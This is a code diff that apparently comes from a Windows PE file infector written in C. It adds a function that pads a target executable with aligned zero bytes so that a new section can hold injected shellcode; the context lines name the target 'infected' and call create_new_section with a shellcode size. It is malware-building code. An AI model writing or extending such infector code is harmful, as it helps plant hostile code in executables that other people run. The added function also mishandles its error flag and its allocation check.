@@ -50,6 +50,57 @@ DWORD get_new_section_virtual_address(EXE_file* infected)
     return align(last_section->Misc.VirtualSize, infected->headers->OptionalHeader.SectionAlignment, last_section->VirtualAddress);
 }
 
+DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_out)
+{
+    // Return the origianl file size.
+
+    // Open file.
+    HANDLE file_handle = CreateFileA(file_name, // open file
+        FILE_APPEND_DATA,         // open for writing
+        FILE_SHARE_READ,          // allow multiple readers
+        NULL,                     // no security
+        OPEN_EXISTING,              // open or create
+        FILE_ATTRIBUTE_NORMAL,    // normal file
+        NULL);                   // no attr. template
+
+    if (file_handle == INVALID_HANDLE_VALUE)
+    {
+        *result_out = ERROR;
+        return 0;
+    }
+
+    DWORD original_code_size = GetFileSize(file_handle, NULL);
+    printf("original file size is %d\n", original_code_size);
+
+    // adding to be in correct alignment.
+    size_of_appned = align(size_of_appned, USUALLY_FILE_ALIGN, 0);
+    size_of_appned += USUALLY_FILE_ALIGN - (original_code_size % USUALLY_FILE_ALIGN);
+    // Fix orginal file size.
+    original_code_size = align(original_code_size, USUALLY_FILE_ALIGN, 0);
+    PVOID zero_buffer = calloc(size_of_appned, 1);
+    int result = 0;
+
+    printf("add empty place to %s\n", file_name);
+    result = WriteFile(file_handle, zero_buffer, size_of_appned, NULL, NULL);
+    if (result == 0)
+    {
+        printf("error appending zeros to end of file");
+        *result_out = ERROR;
+        return 0;
+    }
+    printf("new file size is %d\n", GetFileSize(file_handle, NULL));
+
+    CloseHandle(file_handle);
+    if (zero_buffer != NULL)
+    {
+        free(zero_buffer);
+    }
+    else *result_out = ERROR;
+
+    *result_out = SUCCESS;
+    return original_code_size;
+}
+
 void create_new_section(EXE_file* infected, DWORD shellcode_size)
 {
     IMAGE_SECTION_HEADER new_section = { 0 };
